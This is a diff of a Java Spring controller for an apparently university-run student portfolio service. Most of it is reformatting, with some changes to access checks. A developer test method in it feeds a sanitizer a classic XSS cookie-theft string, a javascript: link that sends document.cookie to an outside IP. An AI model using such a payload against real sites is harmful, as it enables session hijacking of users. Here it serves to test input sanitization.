@@ -109,28 +109,40 @@ public class PortfolioController extends SCController {
 	}
 
 	@RequestMapping(method = RequestMethod.GET, value = "/mobile")
-	public ModelAndView secureMobile(HttpServletRequest request, @RequestParam String token)
-			throws SecurityException, AACException {
-		List<GrantedAuthority> list = Collections.<GrantedAuthority> singletonList(new SimpleGrantedAuthority("ROLE_USER"));
-		Authentication auth = new PreAuthenticatedAuthenticationToken(token, "", list);
+	public ModelAndView secureMobile(HttpServletRequest request,
+			@RequestParam String token) throws SecurityException, AACException {
+		List<GrantedAuthority> list = Collections
+				.<GrantedAuthority> singletonList(new SimpleGrantedAuthority(
+						"ROLE_USER"));
+		Authentication auth = new PreAuthenticatedAuthenticationToken(token,
+				"", list);
 		auth = authenticationManager.authenticate(auth);
 		SecurityContextHolder.getContext().setAuthentication(auth);
-		request.getSession().setAttribute(HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY,
-				SecurityContextHolder.getContext());
+		request.getSession()
+				.setAttribute(
+						HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY,
+						SecurityContextHolder.getContext());
 		return new ModelAndView("redirect:/");
 	}
-	
+
 	@RequestMapping(method = RequestMethod.GET, value = "/check")
-	public ModelAndView securePage(HttpServletRequest request, @RequestParam(required = false) String code)
+	public ModelAndView securePage(HttpServletRequest request,
+			@RequestParam(required = false) String code)
 			throws SecurityException, AACException {
 		String redirectUri = mainURL + "/check";
-		String userToken = aacService.exchngeCodeForToken(code, redirectUri).getAccess_token();
-		List<GrantedAuthority> list = Collections.<GrantedAuthority> singletonList(new SimpleGrantedAuthority("ROLE_USER"));
-		Authentication auth = new PreAuthenticatedAuthenticationToken(userToken, "", list);
+		String userToken = aacService.exchngeCodeForToken(code, redirectUri)
+				.getAccess_token();
+		List<GrantedAuthority> list = Collections
+				.<GrantedAuthority> singletonList(new SimpleGrantedAuthority(
+						"ROLE_USER"));
+		Authentication auth = new PreAuthenticatedAuthenticationToken(
+				userToken, "", list);
 		auth = authenticationManager.authenticate(auth);
 		SecurityContextHolder.getContext().setAuthentication(auth);
-		request.getSession().setAttribute(HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY,
-				SecurityContextHolder.getContext());
+		request.getSession()
+				.setAttribute(
+						HttpSessionSecurityContextRepository.SPRING_SECURITY_CONTEXT_KEY,
+						SecurityContextHolder.getContext());
 		return new ModelAndView("redirect:/");
 	}
 
@@ -139,8 +151,12 @@ public class PortfolioController extends SCController {
 		String redirectUri = mainURL + "/check";
 		return new ModelAndView(
 				"redirect:"
-						+ aacService.generateAuthorizationURIForCodeFlow(redirectUri, null,
-								"smartcampus.profile.basicprofile.me,smartcampus.profile.accountprofile.me", null));
+						+ aacService
+								.generateAuthorizationURIForCodeFlow(
+										redirectUri,
+										null,
+										"smartcampus.profile.basicprofile.me,smartcampus.profile.accountprofile.me",
+										null));
 	}
 
 	/*
@@ -148,7 +164,8 @@ public class PortfolioController extends SCController {
 	 */
 	@RequestMapping(method = RequestMethod.POST, value = "/rest/createstudent")
 	public @ResponseBody
-	Boolean createStudent(HttpServletRequest request, HttpServletResponse response, HttpSession session)
+	Boolean createStudent(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session)
 			throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -157,7 +174,8 @@ public class PortfolioController extends SCController {
 				return null;
 			}
 
-			String unitnId = getAccountProfile(request).getAttribute(PROFILE_UNITN, ATTRIBUTE_IDADA);
+			String unitnId = getAccountProfile(request).getAttribute(
+					PROFILE_UNITN, ATTRIBUTE_IDADA);
 
 			if (unitnId == null) {
 				return false;
@@ -174,7 +192,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.StudentInfo")
 	public @ResponseBody
-	String getStudentInfo(HttpServletRequest request, HttpServletResponse response) throws InvocationException {
+	String getStudentInfo(HttpServletRequest request,
+			HttpServletResponse response) throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
 			if (userId == null) {
@@ -191,7 +210,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.StudentExams")
 	public @ResponseBody
-	String getStudentExams(HttpServletRequest request, HttpServletResponse response, HttpSession session)
+	String getStudentExams(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session)
 			throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -212,12 +232,15 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.Portfolio")
 	public @ResponseBody
-	String getStudentPortfolios(HttpServletRequest request, HttpServletResponse response, HttpSession session)
+	String getStudentPortfolios(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session)
 			throws InvocationException {
-		return PortfolioUtils.listToJSON(getStudentPortfoliosList(request, response));
+		return PortfolioUtils.listToJSON(getStudentPortfoliosList(request,
+				response));
 	}
 
-	private List<String> getStudentPortfoliosList(HttpServletRequest request, HttpServletResponse response) {
+	private List<String> getStudentPortfoliosList(HttpServletRequest request,
+			HttpServletResponse response) {
 		try {
 			String userId = getBasicProfile(request).getUserId();
 			if (userId == null) {
@@ -234,7 +257,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.POST, value = "/rest/smartcampus.services.esse3.Portfolio")
 	public @ResponseBody
-	String createPortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session)
+	String createPortfolio(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session)
 			throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -243,9 +267,11 @@ public class PortfolioController extends SCController {
 				return "";
 			}
 
-			Portfolio portfolio = (Portfolio) extractContent(request, Portfolio.class);
+			Portfolio portfolio = (Portfolio) extractContent(request,
+					Portfolio.class);
 			portfolio = sanitize(portfolio);
-			return portfolioManager.createPortfolio(portfolio, userId, Long.valueOf(getBasicProfile(request).getSocialId()));
+			return portfolioManager.createPortfolio(portfolio, userId,
+					Long.valueOf(getBasicProfile(request).getSocialId()));
 		} catch (Exception e) {
 			e.printStackTrace();
 			response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
@@ -255,7 +281,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.PUT, value = "/rest/smartcampus.services.esse3.Portfolio/{id}")
 	public @ResponseBody
-	String updatePortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session,
+	String updatePortfolio(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
 			@PathVariable String id) throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -264,7 +291,8 @@ public class PortfolioController extends SCController {
 				return "";
 			}
 
-			Portfolio portfolio = (Portfolio) extractContent(request, Portfolio.class);
+			Portfolio portfolio = (Portfolio) extractContent(request,
+					Portfolio.class);
 			portfolio = sanitize(portfolio);
 			portfolioManager.updatePortfolio(portfolio, id, userId);
 		} catch (Exception e) {
@@ -275,7 +303,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.DELETE, value = "/rest/smartcampus.services.esse3.Portfolio/{id}")
 	public @ResponseBody
-	String deletePortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session,
+	String deletePortfolio(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
 			@PathVariable String id) throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -296,19 +325,25 @@ public class PortfolioController extends SCController {
 	 */
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.UserProducedData")
 	public @ResponseBody
-	String getUserProducedDataAll(HttpServletRequest request, HttpServletResponse response, HttpSession session)
+	String getUserProducedDataAll(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session)
 			throws IOException, InvocationException {
-		return PortfolioUtils.listToJSON(getUserProducedDataList(request, response, null));
+		return PortfolioUtils.listToJSON(getUserProducedDataList(request,
+				response, null));
 	}
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/smartcampus.services.esse3.UserProducedData/{category}")
 	public @ResponseBody
-	String getUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
-			@PathVariable String category) throws IOException, InvocationException {
-		return PortfolioUtils.listToJSON(getUserProducedDataList(request, response, category));
+	String getUserProducedData(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
+			@PathVariable String category) throws IOException,
+			InvocationException {
+		return PortfolioUtils.listToJSON(getUserProducedDataList(request,
+				response, category));
 	}
 
-	private List<String> getUserProducedDataList(HttpServletRequest request, HttpServletResponse response, String category) {
+	private List<String> getUserProducedDataList(HttpServletRequest request,
+			HttpServletResponse response, String category) {
 		try {
 			String userId = getBasicProfile(request).getUserId();
 			if (userId == null) {
@@ -325,7 +360,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.POST, value = "/rest/smartcampus.services.esse3.UserProducedData")
 	public @ResponseBody
-	String createUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session)
+	String createUserProducedData(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session)
 			throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -334,7 +370,8 @@ public class PortfolioController extends SCController {
 				return "";
 			}
 
-			UserProducedData upd = (UserProducedData) extractContent(request, UserProducedData.class);
+			UserProducedData upd = (UserProducedData) extractContent(request,
+					UserProducedData.class);
 			upd = sanitize(upd);
 			portfolioManager.createUserProducedData(upd, userId);
 		} catch (Exception e) {
@@ -346,7 +383,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.PUT, value = "/rest/smartcampus.services.esse3.UserProducedData/{id}")
 	public @ResponseBody
-	String updateUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
+	String updateUserProducedData(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
 			@PathVariable String id) throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -355,7 +393,8 @@ public class PortfolioController extends SCController {
 				return "";
 			}
 
-			UserProducedData upd = (UserProducedData) extractContent(request, UserProducedData.class);
+			UserProducedData upd = (UserProducedData) extractContent(request,
+					UserProducedData.class);
 			upd = sanitize(upd);
 			portfolioManager.updateUserProducedData(upd, id, userId);
 		} catch (Exception e) {
@@ -366,7 +405,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.DELETE, value = "/rest/smartcampus.services.esse3.UserProducedData/{id}")
 	public @ResponseBody
-	String deleteUserProducedData(HttpServletRequest request, HttpServletResponse response, HttpSession session,
+	String deleteUserProducedData(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
 			@PathVariable String id) throws InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -385,8 +425,10 @@ public class PortfolioController extends SCController {
 	// GENERIC OBJECT
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/object/{id}/{type}")
 	public @ResponseBody
-	String getObjectById(HttpServletRequest request, HttpServletResponse response, HttpSession session,
-			@PathVariable String id, @PathVariable String type) throws IOException, InvocationException {
+	String getObjectById(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
+			@PathVariable String id, @PathVariable String type)
+			throws IOException, InvocationException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
 			if (userId == null) {
@@ -414,7 +456,8 @@ public class PortfolioController extends SCController {
 	// USER PROFILE
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/getprofile")
 	public @ResponseBody
-	PmBasicProfile getProfile(HttpServletRequest request, HttpServletResponse response, HttpSession session) throws Exception {
+	PmBasicProfile getProfile(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session) throws Exception {
 		try {
 			PmBasicProfile basicProfile = getProfileData(request, response);
 			return basicProfile;
@@ -425,17 +468,21 @@ public class PortfolioController extends SCController {
 		return null;
 	}
 
-	private PmBasicProfile getProfileData(HttpServletRequest request, HttpServletResponse response) throws Exception {
+	private PmBasicProfile getProfileData(HttpServletRequest request,
+			HttpServletResponse response) throws Exception {
 		BasicProfile basicProfile = getBasicProfile(request);
 		PmBasicProfile pmb = new PmBasicProfile(basicProfile);
 
-		String unitnId = getAccountProfile(request).getAttribute(PROFILE_UNITN, ATTRIBUTE_IDADA);
+		String unitnId = getAccountProfile(request).getAttribute(PROFILE_UNITN,
+				ATTRIBUTE_IDADA);
 
 		if (unitnId != null) {
 			pmb.setStudent(true);
-			String studentInfo = portfolioManager.getStudentInfo(basicProfile.getUserId());
+			String studentInfo = portfolioManager.getStudentInfo(basicProfile
+					.getUserId());
 			if (studentInfo == null || studentInfo.isEmpty()) {
-				portfolioManager.createStudent(basicProfile.getUserId(), unitnId);
+				portfolioManager.createStudent(basicProfile.getUserId(),
+						unitnId);
 			}
 		}
 
@@ -474,7 +521,8 @@ public class PortfolioController extends SCController {
 	 * Utils, Getters and Setters
 	 */
 	@SuppressWarnings("unused")
-	private String extractContentAsString(ServletRequest request) throws IOException {
+	private String extractContentAsString(ServletRequest request)
+			throws IOException {
 		ServletInputStream sis = request.getInputStream();
 		int c;
 		String s = "";
@@ -496,21 +544,27 @@ public class PortfolioController extends SCController {
 		return null;
 	}
 
-	private String sanitize(String s) throws ValidationException, IntrusionException {
+	private String sanitize(String s) throws ValidationException,
+			IntrusionException {
 		s = validator.getValidSafeHTML("string", s, INPUT_MAX_LENGTH, true);
 		s = StringEscapeUtils.unescapeHtml(s);
 		return s;
 	}
 
-	public static void main(String[] args) throws ValidationException, IntrusionException {
-		String s = ESAPI.validator().getValidSafeHTML("string",
-				"<A HREF=\"javascript:document.location='http://66.102.7.147/'+document.cookie\">XSS</A>", INPUT_MAX_LENGTH,
-				true);
+	public static void main(String[] args) throws ValidationException,
+			IntrusionException {
+		String s = ESAPI
+				.validator()
+				.getValidSafeHTML(
+						"string",
+						"<A HREF=\"javascript:document.location='http://66.102.7.147/'+document.cookie\">XSS</A>",
+						INPUT_MAX_LENGTH, true);
 		s = StringEscapeUtils.unescapeHtml(s);
 		System.err.println(s);
 	}
 
-	private UserProducedData sanitize(UserProducedData upd) throws ValidationException, IntrusionException {
+	private UserProducedData sanitize(UserProducedData upd)
+			throws ValidationException, IntrusionException {
 		if (!upd.getTitle().isEmpty()) {
 			upd.setTitle(sanitize(upd.getTitle()));
 		}
@@ -523,14 +577,16 @@ public class PortfolioController extends SCController {
 		return upd;
 	}
 
-	private UserData sanitize(UserData userdata) throws ValidationException, IntrusionException {
+	private UserData sanitize(UserData userdata) throws ValidationException,
+			IntrusionException {
 		if (!userdata.getNotes().isEmpty()) {
 			userdata.setNotes(sanitize(userdata.getNotes()));
 		}
 		return userdata;
 	}
 
-	private Portfolio sanitize(Portfolio portfolio) throws ValidationException, IntrusionException {
+	private Portfolio sanitize(Portfolio portfolio) throws ValidationException,
+			IntrusionException {
 		if (!portfolio.getName().isEmpty()) {
 			portfolio.setName(sanitize(portfolio.getName()));
 		}
@@ -538,7 +594,8 @@ public class PortfolioController extends SCController {
 		List<String> list;
 
 		// showUserGeneratedData
-		if (portfolio.getShowUserGeneratedData() != null && !portfolio.getShowUserGeneratedData().isEmpty()) {
+		if (portfolio.getShowUserGeneratedData() != null
+				&& !portfolio.getShowUserGeneratedData().isEmpty()) {
 			list = new ArrayList<String>();
 			for (String s : portfolio.getShowUserGeneratedData()) {
 				s = sanitize(s);
@@ -550,7 +607,8 @@ public class PortfolioController extends SCController {
 		}
 
 		// highlightUserGeneratedData
-		if (portfolio.getHighlightUserGeneratedData() != null && !portfolio.getHighlightUserGeneratedData().isEmpty()) {
+		if (portfolio.getHighlightUserGeneratedData() != null
+				&& !portfolio.getHighlightUserGeneratedData().isEmpty()) {
 			list = new ArrayList<String>();
 			for (String s : portfolio.getHighlightUserGeneratedData()) {
 				s = sanitize(s);
@@ -562,7 +620,8 @@ public class PortfolioController extends SCController {
 		}
 
 		// showStudentInfo
-		if (portfolio.getShowStudentInfo() != null && !portfolio.getShowStudentInfo().isEmpty()) {
+		if (portfolio.getShowStudentInfo() != null
+				&& !portfolio.getShowStudentInfo().isEmpty()) {
 			list = new ArrayList<String>();
 			for (String s : portfolio.getShowStudentInfo()) {
 				s = sanitize(s);
@@ -581,7 +640,8 @@ public class PortfolioController extends SCController {
 	 */
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.StudentInfo")
 	public @ResponseBody
-	List<StudentInfo> getStudentInfo_Remote(HttpServletRequest request, HttpServletResponse response) throws Exception {
+	List<StudentInfo> getStudentInfo_Remote(HttpServletRequest request,
+			HttpServletResponse response) throws Exception {
 		StudentInfo si = new StudentInfo();
 
 		String studentInfo = getStudentInfo(request, response);
@@ -609,14 +669,15 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.StudentExams")
 	public @ResponseBody
-	List<StudentExams> getStudentExams_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session)
-			throws Exception {
+	List<StudentExams> getStudentExams_Remote(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session) throws Exception {
 		List<StudentExams> seList = new ArrayList<StudentExams>();
 		String seString = getStudentExams(request, response, session);
 
 		if (seString != null && !seString.isEmpty()) {
 			DomainObject obj = new DomainObject(seString);
-			StudentExams p = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
+			StudentExams p = PortfolioUtils.convert(obj.getContent(),
+					StudentExams.class);
 			p.setId(obj.getId());
 			seList.add(p);
 		}
@@ -626,7 +687,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.UserProducedData")
 	public @ResponseBody
-	List<UserProducedData> getUserProducedDataAll_Remote(HttpServletRequest request, HttpServletResponse response,
+	List<UserProducedData> getUserProducedDataAll_Remote(
+			HttpServletRequest request, HttpServletResponse response,
 			HttpSession session) throws Exception {
 		List<UserProducedData> updList = new ArrayList<UserProducedData>();
 		List<String> list = getUserProducedDataList(request, response, null);
@@ -634,7 +696,8 @@ public class PortfolioController extends SCController {
 		if (list != null) {
 			for (String s : list) {
 				DomainObject obj = new DomainObject(s);
-				UserProducedData p = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
+				UserProducedData p = PortfolioUtils.convert(obj.getContent(),
+						UserProducedData.class);
 				p.setId(obj.getId());
 				updList.add(p);
 			}
@@ -645,15 +708,16 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio")
 	public @ResponseBody
-	List<Portfolio> getStudentPortfolios_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session)
-			throws Exception {
+	List<Portfolio> getStudentPortfolios_Remote(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session) throws Exception {
 		List<Portfolio> portfoliosList = new ArrayList<Portfolio>();
 		List<String> list = getStudentPortfoliosList(request, response);
 
 		if (list != null) {
 			for (String s : list) {
 				DomainObject obj = new DomainObject(s);
-				Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
+				Portfolio p = PortfolioUtils.convert(obj.getContent(),
+						Portfolio.class);
 				p.setId(obj.getId());
 				portfoliosList.add(p);
 			}
@@ -664,14 +728,15 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.POST, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio")
 	public @ResponseBody
-	Portfolio createPortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session)
-			throws Exception {
+	Portfolio createPortfolio_Remote(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session) throws Exception {
 		Portfolio portfolio = null;
 		String portfolioString = createPortfolio(request, response, session);
 
 		if (portfolioString != null && !portfolioString.isEmpty()) {
 			DomainObject obj = new DomainObject(portfolioString);
-			portfolio = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
+			portfolio = PortfolioUtils.convert(obj.getContent(),
+					Portfolio.class);
 			portfolio.setId(obj.getId());
 		}
 
@@ -680,21 +745,24 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.PUT, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio/{id}")
 	public @ResponseBody
-	String updatePortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session,
+	String updatePortfolio_Remote(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
 			@PathVariable String id) throws InvocationException {
 		return updatePortfolio(request, response, session, id);
 	}
 
 	@RequestMapping(method = RequestMethod.DELETE, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio/{id}")
 	public @ResponseBody
-	String deletePortfolio_Remote(HttpServletRequest request, HttpServletResponse response, HttpSession session,
+	String deletePortfolio_Remote(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
 			@PathVariable String id) throws InvocationException {
 		return deletePortfolio(request, response, session, id);
 	}
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.UserData")
 	public @ResponseBody
-	List<UserData> getUserData(HttpServletRequest request, HttpServletResponse response) throws DataException,
+	List<UserData> getUserData(HttpServletRequest request,
+			HttpServletResponse response) throws DataException,
 			NotFoundException, SecurityException, ProfileServiceException {
 		String userId = getBasicProfile(request).getUserId();
 		if (userId == null) {
@@ -716,7 +784,8 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.PUT, value = "/rest/eu.trentorise.smartcampus.portfolio.models.UserData/{id}")
 	public @ResponseBody
-	UserData updateUserData(HttpServletRequest request, HttpServletResponse response, @PathVariable String id,
+	UserData updateUserData(HttpServletRequest request,
+			HttpServletResponse response, @PathVariable String id,
 			@RequestBody Map<String, Object> obj) throws DataException {
 		try {
 			String userId = getBasicProfile(request).getUserId();
@@ -738,18 +807,21 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.Portfolio/entity/{entityId}")
 	public @ResponseBody
-	Portfolio getPortfolioByEntityId(HttpServletRequest request, HttpServletResponse response, HttpSession session,
+	Portfolio getPortfolioByEntityId(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
 			@PathVariable Long entityId) throws Exception {
 
 		// check the current user
-		String currentUserId = getBasicProfile(request).getUserId();
+		BasicProfile profile = getBasicProfile(request);
+		String currentUserId = profile.getUserId();
 		if (currentUserId == null) {
 			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
 			return null;
 		}
 
 		// read the portfolio first
-		String portfolioString = portfolioManager.getPortfolioByEntityId(entityId);
+		String portfolioString = portfolioManager
+				.getPortfolioByEntityId(entityId);
 		if (portfolioString == null)
 			return null;
 		DomainObject obj = new DomainObject(portfolioString);
@@ -757,7 +829,9 @@ public class PortfolioController extends SCController {
 		p.setId(obj.getId());
 
 		// check if can access portfolio
-		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
+		PortfolioUser user = new PortfolioUser(profile);
+		user.setUserToken(getToken(request));
+		if (!canRead(user, p.getEntityId().toString())) {
 			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
 			return null;
 		}
@@ -766,26 +840,31 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.StudentInfo/portfolio/{portfolioId}")
 	public @ResponseBody
-	StudentInfo getStudentInfoByPortfolio(HttpServletRequest request, HttpServletResponse response, HttpSession session,
+	StudentInfo getStudentInfoByPortfolio(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
 			@PathVariable String portfolioId) throws Exception {
 		StudentInfo si = new StudentInfo();
 
 		// check the current user
-		String currentUserId = getBasicProfile(request).getUserId();
+		BasicProfile profile = getBasicProfile(request);
+		String currentUserId = profile.getUserId();
 		if (currentUserId == null) {
 			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
 			return null;
 		}
 
 		// read the portfolio first
-		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
+		String portfolioString = portfolioManager
+				.getStudentPortfolio(portfolioId);
 		if (portfolioString == null)
 			return null;
 		DomainObject obj = new DomainObject(portfolioString);
 		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
 
 		// check if can access portfolio
-		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
+		PortfolioUser user = new PortfolioUser(profile);
+		user.setUserToken(getToken(request));
+		if (!canRead(user, p.getEntityId().toString())) {
 			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
 			return null;
 		}
@@ -820,26 +899,31 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.StudentExams/portfolio/{portfolioId}")
 	public @ResponseBody
-	List<StudentExams> getStudentExamsByPortfolio(HttpServletRequest request, HttpServletResponse response,
-			HttpSession session, @PathVariable String portfolioId) throws Exception {
+	List<StudentExams> getStudentExamsByPortfolio(HttpServletRequest request,
+			HttpServletResponse response, HttpSession session,
+			@PathVariable String portfolioId) throws Exception {
 		List<StudentExams> seList = new ArrayList<StudentExams>();
 
 		// check the current user
-		String currentUserId = getBasicProfile(request).getUserId();
+		BasicProfile profile = getBasicProfile(request);
+		String currentUserId = profile.getUserId();
 		if (currentUserId == null) {
 			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
 			return null;
 		}
 
 		// read the portfolio first
-		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
+		String portfolioString = portfolioManager
+				.getStudentPortfolio(portfolioId);
 		if (portfolioString == null)
 			return null;
 		DomainObject obj = new DomainObject(portfolioString);
 		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
 
 		// check if can access portfolio
-		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
+		PortfolioUser user = new PortfolioUser(profile);
+		user.setUserToken(getToken(request));
+		if (!canRead(user, p.getEntityId().toString())) {
 			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
 			return null;
 		}
@@ -854,7 +938,8 @@ public class PortfolioController extends SCController {
 		if (updString == null)
 			return null;
 		obj = new DomainObject(updString);
-		UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
+		UserProducedData upd = PortfolioUtils.convert(obj.getContent(),
+				UserProducedData.class);
 		upd.setId(obj.getId());
 
 		if (!udList.contains(obj.getId())) {
@@ -865,7 +950,8 @@ public class PortfolioController extends SCController {
 
 		if (seString != null && !seString.isEmpty()) {
 			obj = new DomainObject(seString);
-			StudentExams se = PortfolioUtils.convert(obj.getContent(), StudentExams.class);
+			StudentExams se = PortfolioUtils.convert(obj.getContent(),
+					StudentExams.class);
 			se.setId(obj.getId());
 			seList.add(se);
 		}
@@ -875,27 +961,32 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.UserProducedData/portfolio/{portfolioId}")
 	public @ResponseBody
-	List<UserProducedData> getUserProducedDataByPortfolio(HttpServletRequest request, HttpServletResponse response,
+	List<UserProducedData> getUserProducedDataByPortfolio(
+			HttpServletRequest request, HttpServletResponse response,
 			@PathVariable String portfolioId) throws Exception {
 		List<UserProducedData> updList = new ArrayList<UserProducedData>();
 		// List<String> list = getUserProducedDataList(request, response, null);
 
 		// check the current user
-		String currentUserId = getBasicProfile(request).getUserId();
+		BasicProfile profile = getBasicProfile(request);
+		String currentUserId = profile.getUserId();
 		if (currentUserId == null) {
 			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
 			return null;
 		}
 
 		// read the portfolio first
-		String portfolioString = portfolioManager.getStudentPortfolio(portfolioId);
+		String portfolioString = portfolioManager
+				.getStudentPortfolio(portfolioId);
 		if (portfolioString == null)
 			return null;
 		DomainObject obj = new DomainObject(portfolioString);
 		Portfolio p = PortfolioUtils.convert(obj.getContent(), Portfolio.class);
 
 		// check if can access portfolio
-		if (!canRead(Long.valueOf(getBasicProfile(request).getSocialId()), p.getEntityId())) {
+		PortfolioUser user = new PortfolioUser(profile);
+		user.setUserToken(getToken(request));
+		if (!canRead(user, p.getEntityId().toString())) {
 			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
 			return null;
 		}
@@ -909,7 +1000,8 @@ public class PortfolioController extends SCController {
 			for (String s : udList) {
 				String updString = portfolioManager.getUserProducedData(s);
 				obj = new DomainObject(updString);
-				UserProducedData upd = PortfolioUtils.convert(obj.getContent(), UserProducedData.class);
+				UserProducedData upd = PortfolioUtils.convert(obj.getContent(),
+						UserProducedData.class);
 				upd.setId(obj.getId());
 				updList.add(upd);
 			}
@@ -920,17 +1012,23 @@ public class PortfolioController extends SCController {
 
 	@RequestMapping(method = RequestMethod.GET, value = "/rest/eu.trentorise.smartcampus.portfolio.models.SharedPortfolioContainer/{entityId}")
 	public @ResponseBody
-	SharedPortfolioContainer getSharedPortfolio(HttpServletRequest request, HttpServletResponse response,
-			@PathVariable Long entityId) throws Exception {
+	SharedPortfolioContainer getSharedPortfolio(HttpServletRequest request,
+			HttpServletResponse response, @PathVariable Long entityId)
+			throws Exception {
+
 		// check the current user
-		String currentUserId = getBasicProfile(request).getUserId();
+		BasicProfile profile = getBasicProfile(request);
+		String currentUserId = profile.getUserId();
 		if (currentUserId == null) {
 			response.setStatus(HttpServletResponse.SC_FORBIDDEN);
 			return null;
 		}
+		PortfolioUser user = new PortfolioUser(profile);
+		user.setUserToken(getToken(request));
 
 		// read the portfolio first
